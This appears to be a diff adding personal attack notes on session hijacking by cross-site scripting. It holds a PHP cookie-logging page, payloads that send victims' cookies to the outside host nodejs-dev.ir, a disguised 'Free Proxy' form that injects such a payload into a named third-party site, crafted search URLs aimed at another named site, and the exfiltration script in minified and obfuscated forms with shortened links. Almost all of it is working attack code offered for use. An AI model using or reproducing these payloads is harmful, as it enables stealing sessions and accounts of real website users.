@@ -1,0 +1,192 @@
+Session Hijacking:
+document.cookie
+
+send Data to Hacker :
+	1 - link (get)
+	2 - post
+	3 - ajax -> xhr
+	4 - iframe - jaavscript
+	
+	
+<script>alert(document.cookie);</script>
+
+
+hack.com
+index.php
+<?php
+	ini_set("display_errors","off");
+	error_reporting(0);
+	$date = date("Y-m-d H:i:s");
+	$ip = $_SERVER['REMOTE_ADDR'];
+	$user_agent = $_SERVER['HTTP_USER_AGENT'];
+	$cookie = isset($_GET['u']) ? $_GET['u'] : '';
+	$fp = fopen("log_meisam.php","a+");
+	$data = "Date : $date\n";
+	$data .= "IP : $ip\n";
+	$data .= "Browser : $user_agent\n";
+	$data .= "Cookie : $cookie\n";
+	$data .= "=============================================\n";
+	fwrite($fp,$data);
+	fclose($fp);
+	header("Location:https://google.com");
+?>
+
+
+http://nodejs-dev.ir/?u=jafar
+
+
+<script>location.href='http://nodejs-dev.ir/?u='+document.cookie;</script>
+
+
+
+
+<img src="a" onerror="alert(document.cookie)">
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Free Proxy</title>
+</head>
+
+<body>
+	<?php
+		if(isset($_GET['run']))
+		{
+			print "Proxy Serve is busy please try agin!";
+		}
+	?>
+	<form method="post" action="http://www.askvancouver.ca/local_search_results.php">
+		Url : 
+		<input type="text" name="url">
+		<input type="hidden" name="localsch" value='<img src="a" onerror="document.body.innerHTML=`please wait ...`;location.href=`http://nodejs-dev.ir/?u=`+document.cookie;">'>
+		<input type="hidden" value="search" name="searc">
+		<input type="submit" value="Go" name="btn_run">
+	</form>
+</body>
+</html> 
+
+Post:
+http://www.askvancouver.ca/local_search_results.php
+localsch=<script>location.href=`http://nodejs-dev.ir/?u=`+document.cookie;</script>&searc=search
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Free Proxy</title>
+</head>
+
+<body>
+	<form method="post" action="">
+		Url : 
+		<input type="text" name="url">
+		<input type="button" value="Go" name="btn_run">
+	</form>
+<script>
+var http = new XMLHttpRequest();
+var url = 'http://wwuw.askvancouver.ca/local_search_results.php';
+var params = 'localsch=salam&searc=search';
+http.open('POST', url, true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(params);
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+        console.log(http.responseText);
+    }
+}
+</script>	
+</body>
+</html> s
+
+
+
+
+Bypass sop:
+Target -> Hacker -> OK 
+Target <- Hacker -> Error
+
+XSS Store Swf:
+
+
+crossdomain.xml
+<?xml version="1.0"?>
+<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
+<cross-domain-policy>
+<allow-access-from domain="*" />
+</cross-domain-policy>
+
+
+
+footballdolphinsofficials.com
+
+
+</title><img src="1" onerror="alert(1)">
+
+
+
+
+
+http://www.footballdolphinsofficials.com/index.php?main_page=advanced_search_result&keywords=</title><img src="1" onerror="location.href=`http://nodejs-dev.ir/?u=`+%2b+document.cookie;">&x=23&y=7
+http://www.footballdolphinsofficials.com/index.php?main_page=advanced_search_result&keywords=</title><img src="1" onerror="location.href=`http://nodejs-dev.ir/?u=${document.cookie}`;">&x=23&y=7
+
+
+https://bit.ly/2FL1HzI
+
+
+<?php
+	ini_set("display_errors","off");
+	error_reporting(0);
+	$date = date("Y-m-d H:i:s");
+	$ip = $_SERVER['REMOTE_ADDR'];
+	$user_agent = $_SERVER['HTTP_USER_AGENT'];
+	$cookie = isset($_GET['u']) ? $_GET['u'] : '';
+	$fp = fopen("log_meisam.php","a+");
+	$data = "Date : $date\n";
+	$data .= "IP : $ip\n";
+	$data .= "Browser : $user_agent\n";
+	$data .= "Cookie : $cookie\n";
+	$data .= "=============================================\n";
+	fwrite($fp,$data);
+	fclose($fp);
+	header("Location:http://www.footballdolphinsofficials.com/index.php?main_page=advanced_search_result&keywords=a&x=23&y=7");
+?>
+
+
+
+var http = new XMLHttpRequest();
+var url = 'http://nodejs-dev.ir/';
+var params = `u=${document.cookie}`;
+http.open('POST', url, true);
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(params);
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+		location.href='http://www.footballdolphinsofficials.com/';
+    }
+}
+
+
+var http=new XMLHttpRequest();var url='http://nodejs-dev.ir/';var params=`u=${document.cookie}`;http.open('POST',url,!0);http.setRequestHeader('Content-type','application/x-www-form-urlencoded');http.send(params);http.onreadystatechange=function(){if(http.readyState==4&&http.status==200){location.href='http://www.footballdolphinsofficials.com/'}}
+
+
+var _0x35e9=['status','http://www.footballdolphinsofficials.com/','http://nodejs-dev.ir/','cookie','POST','setRequestHeader','Content-type','application/x-www-form-urlencoded','send','onreadystatechange'];(function(_0x2544c6,_0x1bd670){var _0x2d1505=function(_0x3a07e2){while(--_0x3a07e2){_0x2544c6['push'](_0x2544c6['shift']());}};_0x2d1505(++_0x1bd670);}(_0x35e9,0x1c4));var _0x4579=function(_0x3ad8f5,_0x1e0ffe){_0x3ad8f5=_0x3ad8f5-0x0;var _0x34247b=_0x35e9[_0x3ad8f5];return _0x34247b;};var http=new XMLHttpRequest();var url=_0x4579('0x0');var params=`u=${document.cookie}`;http['open'](_0x4579('0x2'),url,!![]);http[_0x4579('0x3')](_0x4579('0x4'),_0x4579('0x5'));http[_0x4579('0x6')](params);http[_0x4579('0x7')]=function(){if(http['readyState']==0x4&&http[_0x4579('0x8')]==0xc8){location['href']=_0x4579('0x9');}};
+
+http://www.footballdolphinsofficials.com/index.php?main_page=advanced_search_result&keywords=</title><img src="1" onerror="var _0x35e9=['status','http://www.footballdolphinsofficials.com/','http://nodejs-dev.ir/','cookie','POST','setRequestHeader','Content-type','application/x-www-form-urlencoded','send','onreadystatechange'];(function(_0x2544c6,_0x1bd670){var _0x2d1505=function(_0x3a07e2){while(--_0x3a07e2){_0x2544c6['push'](_0x2544c6['shift']());}};_0x2d1505(++_0x1bd670);}(_0x35e9,0x1c4));var _0x4579=function(_0x3ad8f5,_0x1e0ffe){_0x3ad8f5=_0x3ad8f5-0x0;var _0x34247b=_0x35e9[_0x3ad8f5];return _0x34247b;};var http=new XMLHttpRequest();var url=_0x4579('0x0');var params='u='+document[_0x4579('0x1')];http['open'](_0x4579('0x2'),url,!![]);http[_0x4579('0x3')](_0x4579('0x4'),_0x4579('0x5'));http[_0x4579('0x6')](params);http[_0x4579('0x7')]=function(){if(http['readyState']==0x4&&http[_0x4579('0x8')]==0xc8){location['href']=_0x4579('0x9');}};">&x=23&y=7
+
+
+
+https://bit.ly/2DGS5TZ
+
+
+
+
+
+
+
